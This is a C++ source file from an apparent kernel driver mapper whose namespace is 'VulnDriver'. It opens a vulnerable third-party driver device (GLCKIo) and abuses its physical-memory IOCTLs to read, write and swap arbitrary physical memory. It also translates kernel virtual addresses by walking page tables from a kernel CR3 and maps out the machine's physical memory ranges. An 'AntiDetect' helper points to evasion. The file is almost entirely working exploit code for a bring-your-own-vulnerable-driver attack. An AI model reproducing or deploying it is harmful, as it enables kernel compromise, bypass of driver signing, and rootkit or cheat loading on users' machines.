#include "Mapper.h"
#include <SetupAPI.h>
#include <devguid.h>
#include <initguid.h>
#include <cfgmgr32.h>
#include <TlHelp32.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <mscat.h>
#include <string>
#include <cstdarg>
#include <algorithm>
#include <vector>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")

// Forward declare from MapperCore.cpp
extern FILE* g_LogFile;
static void VDbgLog(const char* func, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);
    int prefixLen = snprintf(buf, sizeof(buf), "[VulnDriver][%s] ", func);
    if (prefixLen < 0) prefixLen = 0;
    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
    va_end(args);
    printf("%s\n", buf);
    fflush(stdout);
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");
    if (g_LogFile) { fprintf(g_LogFile, "%s\n", buf); FlushMapperLogFile(); }
}
#define VLOG(fmt, ...) VDbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
#define VLOG_STATUS(msg, st) VDbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")

static ULONGLONG VElapsedMs(ULONGLONG start) {
    ULONGLONG now = GetTickCount64();
    return now >= start ? now - start : 0;
}

static ULONG VBuildNumber() {
    return *reinterpret_cast<volatile ULONG*>(static_cast<ULONG_PTR>(0x7FFE0260)) & 0xFFFFu;
}

DEFINE_GUID(GUID_DEVINTERFACE_GIO,
    0x70a35746, 0x5d4c, 0x4d58, 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e);

DEFINE_GUID(GUID_DEVINTERFACE_GIO_ALT,
    0x4d36e97d, 0xe325, 0x11ce, 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18);

namespace VulnDriver {

    static ULONGLONG g_MaxPhysAddr = 0;
    struct PhysicalRange {
        ULONGLONG base;
        ULONGLONG size;
    };

#pragma pack(push, 4)
    struct RegistryPartialResourceDescriptor {
        UCHAR type;
        UCHAR shareDisposition;
        USHORT flags;
        union {
            struct {
                LARGE_INTEGER start;
                ULONG length;
            } memory;
            struct {
                LARGE_INTEGER start;
                ULONG length40;
            } memory40;
            struct {
                LARGE_INTEGER start;
                ULONG length48;
            } memory48;
            struct {
                LARGE_INTEGER start;
                ULONG length64;
            } memory64;
            BYTE raw[16];
        } u;
    };

    struct RegistryPartialResourceList {
        USHORT version;
        USHORT revision;
        ULONG count;
        RegistryPartialResourceDescriptor descriptors[1];
    };

    struct RegistryFullResourceDescriptor {
        ULONG interfaceType;
        ULONG busNumber;
        RegistryPartialResourceList partialResourceList;
    };

    struct RegistryResourceList {
        ULONG count;
        RegistryFullResourceDescriptor list[1];
    };
#pragma pack(pop)

    static constexpr UCHAR kRegistryResourceTypeMemory = 3;
    static constexpr UCHAR kRegistryResourceTypeMemoryLarge = 7;
    static constexpr USHORT kRegistryMemoryLarge40 = 0x0200;
    static constexpr USHORT kRegistryMemoryLarge48 = 0x0400;
    static constexpr USHORT kRegistryMemoryLarge64 = 0x0800;

    static const wchar_t* DeviceNames[] = {
        L"\\??\\GLCKIo",
        L"\\Device\\GLCKIo",
        L"\\DosDevices\\GLCKIo"
    };

    static BOOL TryOpenDeviceInterface(const GUID* interfaceGuid, PHANDLE deviceHandle) {
        HDEVINFO deviceInfoSet = SetupDiGetClassDevsW(
            interfaceGuid,
            nullptr,
            nullptr,
            DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
        );

        if (deviceInfoSet == INVALID_HANDLE_VALUE) {
            return FALSE;
        }

        SP_DEVICE_INTERFACE_DATA interfaceData = { 0 };
        interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

        for (DWORD index = 0; SetupDiEnumDeviceInterfaces(deviceInfoSet, nullptr, interfaceGuid, index, &interfaceData); index++) {
            DWORD requiredSize = 0;
            SetupDiGetDeviceInterfaceDetailW(deviceInfoSet, &interfaceData, nullptr, 0, &requiredSize, nullptr);

            if (requiredSize == 0) continue;

            PSP_DEVICE_INTERFACE_DETAIL_DATA_W detailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, requiredSize);

            if (!detailData) continue;

            detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

            if (SetupDiGetDeviceInterfaceDetailW(deviceInfoSet, &interfaceData, detailData, requiredSize, nullptr, nullptr)) {
                HANDLE hDevice = CreateFileW(
                    detailData->DevicePath,
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    nullptr
                );

                HeapFree(GetProcessHeap(), 0, detailData);

                if (hDevice != INVALID_HANDLE_VALUE) {
                    SetupDiDestroyDeviceInfoList(deviceInfoSet);
                    *deviceHandle = hDevice;
                    return TRUE;
                }
            } else {
                HeapFree(GetProcessHeap(), 0, detailData);
            }
        }

        SetupDiDestroyDeviceInfoList(deviceInfoSet);
        return FALSE;
    }

    static BOOL TryOpenViaCfgMgr(PHANDLE deviceHandle) {
        const GUID* guidsToTry[] = {
            &GUID_DEVINTERFACE_GIO,
            &GUID_DEVINTERFACE_GIO_ALT,
            &GUID_DEVCLASS_SYSTEM
        };

        for (int g = 0; g < sizeof(guidsToTry) / sizeof(guidsToTry[0]); g++) {
            ULONG bufferLen = 0;
            CONFIGRET cr = CM_Get_Device_Interface_List_SizeW(
                &bufferLen,
                const_cast<LPGUID>(guidsToTry[g]),
                nullptr,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT
            );

            if (cr != CR_SUCCESS || bufferLen <= 1) continue;

            PWSTR deviceList = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLen * sizeof(WCHAR));
            if (!deviceList) continue;

            cr = CM_Get_Device_Interface_ListW(
                const_cast<LPGUID>(guidsToTry[g]),
                nullptr,
                deviceList,
                bufferLen,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT
            );

            if (cr == CR_SUCCESS) {
                for (PWSTR current = deviceList; *current; current += wcslen(current) + 1) {
                    if (wcsstr(current, L"GLCK") || wcsstr(current, L"glck") ||
                        wcsstr(current, L"GLCKIo") || wcsstr(current, L"glckio")) {
                        HANDLE hDevice = CreateFileW(
                            current,
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            nullptr
                        );

                        if (hDevice != INVALID_HANDLE_VALUE) {
                            HeapFree(GetProcessHeap(), 0, deviceList);
                            *deviceHandle = hDevice;
                            return TRUE;
                        }
                    }
                }
            }

            HeapFree(GetProcessHeap(), 0, deviceList);
        }

        return FALSE;
    }

    NTSTATUS OpenDevice(PHANDLE deviceHandle) {
        VLOG("=== OpenDevice ===");
        if (!deviceHandle) {
            return STATUS_INVALID_PARAMETER;
        }

        *deviceHandle = nullptr;

        if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO, deviceHandle)) {
            VLOG("Opened via GUID_DEVINTERFACE_GIO, handle=%p", *deviceHandle);
            return STATUS_SUCCESS;
        }

        if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO_ALT, deviceHandle)) {
            VLOG("Opened via GUID_DEVINTERFACE_GIO_ALT, handle=%p", *deviceHandle);
            return STATUS_SUCCESS;
        }

        if (TryOpenViaCfgMgr(deviceHandle)) {
            VLOG("Opened via CfgMgr, handle=%p", *deviceHandle);
            return STATUS_SUCCESS;
        }
        VLOG("Interface/CfgMgr methods failed, trying direct device names...");

        NTSTATUS lastStatus = STATUS_OBJECT_NAME_NOT_FOUND;

        for (int i = 0; i < sizeof(DeviceNames) / sizeof(DeviceNames[0]); i++) {
            UNICODE_STRING deviceName;
            USHORT len = static_cast<USHORT>(wcslen(DeviceNames[i]) * sizeof(wchar_t));
            deviceName.Length = len;
            deviceName.MaximumLength = len + sizeof(wchar_t);
            deviceName.Buffer = const_cast<PWSTR>(DeviceNames[i]);

            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

            IO_STATUS_BLOCK ioStatus = { 0 };

            NTSTATUS status = NtCreateFile(
                deviceHandle,
                SYNCHRONIZE | FILE_READ_DATA | FILE_WRITE_DATA,
                &objAttr,
                &ioStatus,
                nullptr,
                FILE_ATTRIBUTE_NORMAL,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FILE_OPEN,
                FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                nullptr,
                0
            );

            lastStatus = status;
            VLOG("  NtCreateFile '%ls': 0x%08X", DeviceNames[i], (DWORD)status);

            if (NT_SUCCESS(status)) {
                VLOG("  Opened via '%ls', handle=%p", DeviceNames[i], *deviceHandle);
                return status;
            }
        }

        VLOG("OpenDevice FAILED, lastStatus=0x%08X", (DWORD)lastStatus);
        return lastStatus;
    }

    static constexpr int MAP_CACHE_SIZE = 8;
    static WINIO_PHYS_MEM g_MapCache[MAP_CACHE_SIZE] = {};
    static int g_MapCacheCount = 0;

    static void CacheMapResult(const WINIO_PHYS_MEM& result) {
        if (g_MapCacheCount < MAP_CACHE_SIZE) {
            g_MapCache[g_MapCacheCount++] = result;
        } else {
            g_MapCache[MAP_CACHE_SIZE - 1] = result;
        }
    }

    static WINIO_PHYS_MEM* FindCachedMap(PVOID mappedAddr) {
        for (int i = 0; i < g_MapCacheCount; i++) {
            if (g_MapCache[i].MappedAddress == mappedAddr) {
                return &g_MapCache[i];
            }
        }
        return nullptr;
    }

    static void RemoveCachedMap(PVOID mappedAddr) {
        for (int i = 0; i < g_MapCacheCount; i++) {
            if (g_MapCache[i].MappedAddress == mappedAddr) {
                for (int j = i; j < g_MapCacheCount - 1; j++) {
                    g_MapCache[j] = g_MapCache[j + 1];
                }
                g_MapCacheCount--;
                memset(&g_MapCache[g_MapCacheCount], 0, sizeof(WINIO_PHYS_MEM));
                return;
            }
        }
    }

    NTSTATUS MapPhysicalMemory(HANDLE device, ULONGLONG physAddr, ULONG size, PVOID* mappedAddr) {
        const ULONGLONG start = GetTickCount64();
        VLOG("MapPhysicalMemory enter device=%p phys=0x%llX size=0x%X out=%p pid=%lu tid=%lu build=%lu max_phys=0x%llX",
            device,
            physAddr,
            size,
            mappedAddr,
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            VBuildNumber(),
            g_MaxPhysAddr);

        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            VLOG("MapPhysicalMemory reject invalid_handle device=%p phys=0x%llX size=0x%X elapsed_ms=%llu",
                device,
                physAddr,
                size,
                VElapsedMs(start));
            return STATUS_INVALID_HANDLE;
        }
        if (!mappedAddr || size == 0) {
            VLOG("MapPhysicalMemory reject invalid_parameter out=%p size=0x%X phys=0x%llX elapsed_ms=%llu",
                mappedAddr,
                size,
                physAddr,
                VElapsedMs(start));
            return STATUS_INVALID_PARAMETER;
        }

        if (g_MaxPhysAddr != 0 && physAddr >= g_MaxPhysAddr) {
            VLOG("MapPhysicalMemory reject phys_out_of_range phys=0x%llX max=0x%llX size=0x%X elapsed_ms=%llu",
                physAddr,
                g_MaxPhysAddr,
                size,
                VElapsedMs(start));
            return STATUS_INVALID_PARAMETER;
        }

        WINIO_PHYS_MEM ioData = { 0 };
        ioData.Size.QuadPart = static_cast<LONGLONG>(size);
        ioData.PhysicalAddress.QuadPart = static_cast<LONGLONG>(physAddr);
        ioData.SectionHandle = nullptr;
        ioData.MappedAddress = nullptr;
        ioData.SectionObject = nullptr;

        IO_STATUS_BLOCK ioStatus = { 0 };

        NTSTATUS status = NtDeviceIoControlFilePtr(
            device,
            nullptr,
            nullptr,
            nullptr,
            &ioStatus,
            IOCTL_WINIO_MAPPHYSTOLIN,
            &ioData,
            sizeof(ioData),
            &ioData,
            sizeof(ioData)
        );
        VLOG("MapPhysicalMemory ioctl_return status=0x%08X io_status=0x%08X info=%llu phys=0x%llX size=0x%X mapped=%p section=%p section_object=%p elapsed_ms=%llu",
            (DWORD)status,
            (DWORD)ioStatus.Status,
            static_cast<unsigned long long>(ioStatus.Information),
            physAddr,
            size,
            ioData.MappedAddress,
            ioData.SectionHandle,
            ioData.SectionObject,
            VElapsedMs(start));

        if (NT_SUCCESS(status) && ioData.MappedAddress != nullptr) {
            *mappedAddr = ioData.MappedAddress;
            CacheMapResult(ioData);
            VLOG("MapPhysicalMemory success phys=0x%llX size=0x%X mapped=%p elapsed_ms=%llu",
                physAddr,
                size,
                *mappedAddr,
                VElapsedMs(start));
        } else {
            if (NT_SUCCESS(status)) {
                VLOG("MapPhysicalMemory: IOCTL succeeded but MappedAddress is NULL! phys=0x%llX size=0x%X",
                     physAddr, size);
                status = STATUS_UNSUCCESSFUL;
            } else {
                VLOG("MapPhysicalMemory FAILED: phys=0x%llX size=0x%X status=0x%08X",
                     physAddr, size, (DWORD)status);
            }
        }

        return status;
    }

    NTSTATUS UnmapPhysicalMemory(HANDLE device, PVOID mappedAddr) {
        const ULONGLONG start = GetTickCount64();
        VLOG("UnmapPhysicalMemory enter device=%p mapped=%p pid=%lu tid=%lu",
            device,
            mappedAddr,
            GetCurrentProcessId(),
            GetCurrentThreadId());

        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            VLOG("UnmapPhysicalMemory reject invalid_handle device=%p mapped=%p elapsed_ms=%llu",
                device,
                mappedAddr,
                VElapsedMs(start));
            return STATUS_INVALID_HANDLE;
        }
        if (!mappedAddr) {
            VLOG("UnmapPhysicalMemory reject invalid_parameter mapped=%p elapsed_ms=%llu",
                mappedAddr,
                VElapsedMs(start));
            return STATUS_INVALID_PARAMETER;
        }

        WINIO_PHYS_UNMAP ioData = { 0 };
        WINIO_PHYS_MEM* cached = FindCachedMap(mappedAddr);
        if (cached) {
            ioData.Size = cached->Size;
            ioData.PhysicalAddress = cached->PhysicalAddress;
            ioData.SectionHandle = cached->SectionHandle;
            ioData.MappedAddress = cached->MappedAddress;
            ioData.SectionObject = cached->SectionObject;
        } else {
            ioData.MappedAddress = mappedAddr;
            ioData.SectionHandle = nullptr;
            ioData.SectionObject = nullptr;
        }

        IO_STATUS_BLOCK ioStatus = { 0 };

        NTSTATUS status = NtDeviceIoControlFilePtr(
            device,
            nullptr,
            nullptr,
            nullptr,
            &ioStatus,
            IOCTL_WINIO_UNMAPPHYSADDR,
            &ioData,
            sizeof(ioData),
            &ioData,
            sizeof(ioData)
        );

        RemoveCachedMap(mappedAddr);
        VLOG("UnmapPhysicalMemory exit status=0x%08X io_status=0x%08X info=%llu mapped=%p cached=%u phys=0x%llX size=0x%llX elapsed_ms=%llu",
            (DWORD)status,
            (DWORD)ioStatus.Status,
            static_cast<unsigned long long>(ioStatus.Information),
            mappedAddr,
            cached ? 1u : 0u,
            static_cast<unsigned long long>(ioData.PhysicalAddress.QuadPart),
            static_cast<unsigned long long>(ioData.Size.QuadPart),
            VElapsedMs(start));

        return status;
    }

    NTSTATUS ReadPhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID buffer, SIZE_T size) {
        const ULONGLONG start = GetTickCount64();
        VLOG("ReadPhysicalMemory enter device=%p phys=0x%llX buffer=%p size=0x%llX pid=%lu tid=%lu",
            device,
            physAddr,
            buffer,
            static_cast<unsigned long long>(size),
            GetCurrentProcessId(),
            GetCurrentThreadId());
        if (!buffer || size == 0) {
            VLOG("ReadPhysicalMemory reject invalid_parameter buffer=%p size=0x%llX elapsed_ms=%llu",
                buffer,
                static_cast<unsigned long long>(size),
                VElapsedMs(start));
            return STATUS_INVALID_PARAMETER;
        }

        PVOID mapped = nullptr;
        ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);

        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
        if (!NT_SUCCESS(status)) {
            VLOG("ReadPhysicalMemory: MapPhysicalMemory failed for phys=0x%llX, status=0x%08X",
                 physAddr, (DWORD)status);
            return status;
        }

        __try {
            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
            memcpy(buffer, (PUCHAR)mapped + offset, size);
            AntiDetect::MemoryBarrier();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            DWORD code = GetExceptionCode();
            UnmapPhysicalMemory(device, mapped);
            VLOG("ReadPhysicalMemory exception code=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
                code,
                physAddr,
                mapped,
                static_cast<unsigned long long>(size),
                VElapsedMs(start));
            return STATUS_ACCESS_VIOLATION;
        }

        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
        VLOG("ReadPhysicalMemory exit status=0x%08X unmap_status=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
            (DWORD)STATUS_SUCCESS,
            (DWORD)unmapStatus,
            physAddr,
            mapped,
            static_cast<unsigned long long>(size),
            VElapsedMs(start));
        return STATUS_SUCCESS;
    }

    NTSTATUS WritePhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID data, SIZE_T size) {
        const ULONGLONG start = GetTickCount64();
        VLOG("WritePhysicalMemory enter device=%p phys=0x%llX data=%p size=0x%llX pid=%lu tid=%lu",
            device,
            physAddr,
            data,
            static_cast<unsigned long long>(size),
            GetCurrentProcessId(),
            GetCurrentThreadId());
        if (!data || size == 0) {
            VLOG("WritePhysicalMemory reject invalid_parameter data=%p size=0x%llX elapsed_ms=%llu",
                data,
                static_cast<unsigned long long>(size),
                VElapsedMs(start));
            return STATUS_INVALID_PARAMETER;
        }

        PVOID mapped = nullptr;
        ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);

        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
        if (!NT_SUCCESS(status)) {
            VLOG("WritePhysicalMemory: MapPhysicalMemory failed for phys=0x%llX, status=0x%08X",
                 physAddr, (DWORD)status);
            return status;
        }

        __try {
            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
            memcpy((PUCHAR)mapped + offset, data, size);
            AntiDetect::MemoryBarrier();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            DWORD code = GetExceptionCode();
            UnmapPhysicalMemory(device, mapped);
            VLOG("WritePhysicalMemory exception code=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
                code,
                physAddr,
                mapped,
                static_cast<unsigned long long>(size),
                VElapsedMs(start));
            return STATUS_ACCESS_VIOLATION;
        }

        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
        VLOG("WritePhysicalMemory exit status=0x%08X unmap_status=0x%08X phys=0x%llX mapped=%p size=0x%llX elapsed_ms=%llu",
            (DWORD)STATUS_SUCCESS,
            (DWORD)unmapStatus,
            physAddr,
            mapped,
            static_cast<unsigned long long>(size),
            VElapsedMs(start));
        return STATUS_SUCCESS;
    }

    NTSTATUS ExchangePhysicalPointer(HANDLE device, ULONGLONG physAddr, PVOID newValue, PVOID* oldValue) {
        const ULONGLONG start = GetTickCount64();
        VLOG("ExchangePhysicalPointer enter device=%p phys=0x%llX new=%p old_out=%p pid=%lu tid=%lu",
            device,
            physAddr,
            newValue,
            oldValue,
            GetCurrentProcessId(),
            GetCurrentThreadId());

        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            VLOG("ExchangePhysicalPointer reject invalid_handle device=%p phys=0x%llX elapsed_ms=%llu",
                device,
                physAddr,
                VElapsedMs(start));
            return STATUS_INVALID_HANDLE;
        }
        if ((physAddr & (sizeof(void*) - 1)) != 0) {
            VLOG("ExchangePhysicalPointer reject unaligned phys=0x%llX align=0x%llX elapsed_ms=%llu",
                physAddr,
                static_cast<unsigned long long>(sizeof(void*)),
                VElapsedMs(start));
            return STATUS_DATATYPE_MISALIGNMENT;
        }

        PVOID mapped = nullptr;
        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, 0x1000, &mapped);
        VLOG("ExchangePhysicalPointer map status=0x%08X phys=0x%llX mapped=%p elapsed_ms=%llu",
            static_cast<DWORD>(status),
            physAddr,
            mapped,
            VElapsedMs(start));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        PVOID previousValue = nullptr;
        __try {
            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
            volatile LONG64* slot = reinterpret_cast<volatile LONG64*>(static_cast<PUCHAR>(mapped) + offset);
            LONG64 newBits = static_cast<LONG64>(reinterpret_cast<ULONG_PTR>(newValue));
            VLOG("ExchangePhysicalPointer before_exchange phys=0x%llX mapped=%p slot=%p new=%p elapsed_ms=%llu",
                physAddr,
                mapped,
                const_cast<LONG64*>(slot),
                newValue,
                VElapsedMs(start));
            LONG64 oldBits = InterlockedExchange64(slot, newBits);
            previousValue = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(oldBits));
            AntiDetect::MemoryBarrier();
            VLOG("ExchangePhysicalPointer after_exchange phys=0x%llX mapped=%p slot=%p old=%p new=%p elapsed_ms=%llu",
                physAddr,
                mapped,
                const_cast<LONG64*>(slot),
                previousValue,
                newValue,
                VElapsedMs(start));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            DWORD code = GetExceptionCode();
            NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
            VLOG("ExchangePhysicalPointer exception code=0x%08X phys=0x%llX mapped=%p unmap_status=0x%08X elapsed_ms=%llu",
                code,
                physAddr,
                mapped,
                static_cast<DWORD>(unmapStatus),
                VElapsedMs(start));
            return STATUS_ACCESS_VIOLATION;
        }

        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
        if (oldValue) {
            *oldValue = previousValue;
        }
        VLOG("ExchangePhysicalPointer exit status=0x%08X unmap_status=0x%08X phys=0x%llX old=%p new=%p elapsed_ms=%llu",
            static_cast<DWORD>(STATUS_SUCCESS),
            static_cast<DWORD>(unmapStatus),
            physAddr,
            previousValue,
            newValue,
            VElapsedMs(start));
        return STATUS_SUCCESS;
    }

    static ULONGLONG g_KernelCR3 = 0;
    static ULONGLONG g_NtoskrnlBase = 0;

    static ULONGLONG GetMaxPhysicalAddress() {
        if (g_MaxPhysAddr != 0) return g_MaxPhysAddr;
        MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
        if (GlobalMemoryStatusEx(&memStatus)) {
            // Use 2x total physical RAM as upper bound (accounts for MMIO gaps)
            g_MaxPhysAddr = memStatus.ullTotalPhys * 2;
            if (g_MaxPhysAddr < 0x100000000ULL) g_MaxPhysAddr = 0x100000000ULL; // 4GB minimum
        } else {
            g_MaxPhysAddr = 0x200000000ULL; // 8GB fallback
        }
        VLOG("Max physical address set to 0x%llX (%.1f GB)", g_MaxPhysAddr, (double)g_MaxPhysAddr / (1024.0*1024.0*1024.0));
        return g_MaxPhysAddr;
    }

    static BOOL IsPhysAddrSafe(ULONGLONG physAddr) {
        ULONGLONG maxPhys = GetMaxPhysicalAddress();
        if (physAddr >= maxPhys) return FALSE;
        // Reject page 0 (null page) and very low addresses (< 4KB)
        if (physAddr < 0x1000) return FALSE;
        return TRUE;
    }

    static BOOL ReadMappedU64(const BYTE* address, ULONGLONG* value) {
        if (!address || !value) {
            return FALSE;
        }

        __try {
            *value = *reinterpret_cast<const ULONGLONG*>(address);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            *value = 0;
            return FALSE;
        }
    }

    static ULONGLONG VirtualToPhysicalWithCR3(HANDLE device, ULONGLONG cr3, ULONGLONG va) {
        ULONGLONG pml4Index = (va >> 39) & 0x1FF;
        ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
        ULONGLONG pdIndex = (va >> 21) & 0x1FF;
        ULONGLONG ptIndex = (va >> 12) & 0x1FF;
        ULONGLONG pageOffset = va & 0xFFF;

        ULONGLONG pml4e = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, cr3 + pml4Index * 8, &pml4e, sizeof(pml4e)))) {
            return 0;
        }
        if (!(pml4e & 1)) {
            return 0;
        }

        ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
        if (!IsPhysAddrSafe(pdptPhys)) return 0;

        ULONGLONG pdpte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdptPhys + pdptIndex * 8, &pdpte, sizeof(pdpte)))) {
            return 0;
        }
        if (!(pdpte & 1)) {
            return 0;
        }
        if (pdpte & 0x80) {
            ULONGLONG result = (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
            return IsPhysAddrSafe(result) ? result : 0;
        }

        ULONGLONG pdPhys = pdpte & 0xFFFFFFFFF000ULL;
        if (!IsPhysAddrSafe(pdPhys)) return 0;

        ULONGLONG pde = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdPhys + pdIndex * 8, &pde, sizeof(pde)))) {
            return 0;
        }
        if (!(pde & 1)) {
            return 0;
        }
        if (pde & 0x80) {
            ULONGLONG result = (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
            return IsPhysAddrSafe(result) ? result : 0;
        }

        ULONGLONG ptPhys = pde & 0xFFFFFFFFF000ULL;
        if (!IsPhysAddrSafe(ptPhys)) return 0;

        ULONGLONG pte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, ptPhys + ptIndex * 8, &pte, sizeof(pte)))) {
            return 0;
        }
        if (!(pte & 1)) {
            return 0;
        }

        ULONGLONG result = (pte & 0xFFFFFFFFF000ULL) + pageOffset;
        return IsPhysAddrSafe(result) ? result : 0;
    }

    static ULONGLONG ResourceMemoryLength(const RegistryPartialResourceDescriptor& desc) {
        if (desc.type == kRegistryResourceTypeMemory) {
            return desc.u.memory.length;
        }

        if (desc.type != kRegistryResourceTypeMemoryLarge) {
            return 0;
        }

        if ((desc.flags & kRegistryMemoryLarge40) == kRegistryMemoryLarge40) {
            return static_cast<ULONGLONG>(desc.u.memory40.length40) << 8;
        }

        if ((desc.flags & kRegistryMemoryLarge48) == kRegistryMemoryLarge48) {
            return static_cast<ULONGLONG>(desc.u.memory48.length48) << 16;
        }

        if ((desc.flags & kRegistryMemoryLarge64) == kRegistryMemoryLarge64) {
            return static_cast<ULONGLONG>(desc.u.memory64.length64) << 32;
        }

        return 0;
    }

    static BOOL QueryPhysicalMemoryRanges(std::vector<PhysicalRange>& ranges) {
        ranges.clear();

        HKEY key = nullptr;
        LSTATUS status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0,
            KEY_QUERY_VALUE,
            &key);
        if (status != ERROR_SUCCESS) {
            VLOG("physical_range_query open_failed gle=%lu", static_cast<unsigned long>(status));
            return FALSE;
        }

        DWORD valueType = 0;
        DWORD valueSize = 0;
        status = RegQueryValueExW(key, L".Translated", nullptr, &valueType, nullptr, &valueSize);
        if (status != ERROR_SUCCESS || valueType != REG_RESOURCE_LIST || valueSize < sizeof(RegistryResourceList)) {
            VLOG("physical_range_query size_failed status=%lu type=%lu size=%lu", static_cast<unsigned long>(status), static_cast<unsigned long>(valueType), static_cast<unsigned long>(valueSize));
            RegCloseKey(key);
            return FALSE;
        }

        std::vector<BYTE> buffer(valueSize);
        status = RegQueryValueExW(key, L".Translated", nullptr, &valueType, buffer.data(), &valueSize);
        RegCloseKey(key);
        if (status != ERROR_SUCCESS || valueType != REG_RESOURCE_LIST || valueSize < sizeof(RegistryResourceList)) {
            VLOG("physical_range_query read_failed status=%lu type=%lu size=%lu", static_cast<unsigned long>(status), static_cast<unsigned long>(valueType), static_cast<unsigned long>(valueSize));
            return FALSE;
        }

        const auto* list = reinterpret_cast<const RegistryResourceList*>(buffer.data());
        const BYTE* cursor = reinterpret_cast<const BYTE*>(&list->list[0]);
        const BYTE* end = buffer.data() + valueSize;

        for (ULONG fullIndex = 0; fullIndex < list->count; ++fullIndex) {
            if (cursor + sizeof(RegistryFullResourceDescriptor) > end) {
                break;
            }

            const auto* full = reinterpret_cast<const RegistryFullResourceDescriptor*>(cursor);
            const ULONG partialCount = full->partialResourceList.count;
            const BYTE* partialCursor = reinterpret_cast<const BYTE*>(&full->partialResourceList.descriptors[0]);
            const BYTE* nextFull = partialCursor + static_cast<SIZE_T>(partialCount) * sizeof(RegistryPartialResourceDescriptor);
            if (nextFull > end) {
                break;
            }

            for (ULONG partialIndex = 0; partialIndex < partialCount; ++partialIndex) {
                const auto& desc = full->partialResourceList.descriptors[partialIndex];
                const ULONGLONG length = ResourceMemoryLength(desc);
                const ULONGLONG start = desc.u.memory.start.QuadPart;
                if (length == 0 || start < 0x1000) {
                    continue;
                }

                ULONGLONG alignedStart = (start + 0xFFFULL) & ~0xFFFULL;
                ULONGLONG endAddress = start + length;
                if (endAddress <= alignedStart) {
                    continue;
                }
                endAddress &= ~0xFFFULL;
                if (endAddress <= alignedStart) {
                    continue;
                }

                ranges.push_back({ alignedStart, endAddress - alignedStart });
            }

            cursor = nextFull;
        }

        std::sort(ranges.begin(), ranges.end(), [](const PhysicalRange& a, const PhysicalRange& b) {
            return a.base < b.base;
        });

        VLOG("physical_range_query result count=%zu", ranges.size());
        for (size_t i = 0; i < ranges.size(); ++i) {
            VLOG("physical_range[%zu] base=0x%llX size=0x%llX end=0x%llX", i, ranges[i].base, ranges[i].size, ranges[i].base + ranges[i].size);
        }

        return !ranges.empty();
    }

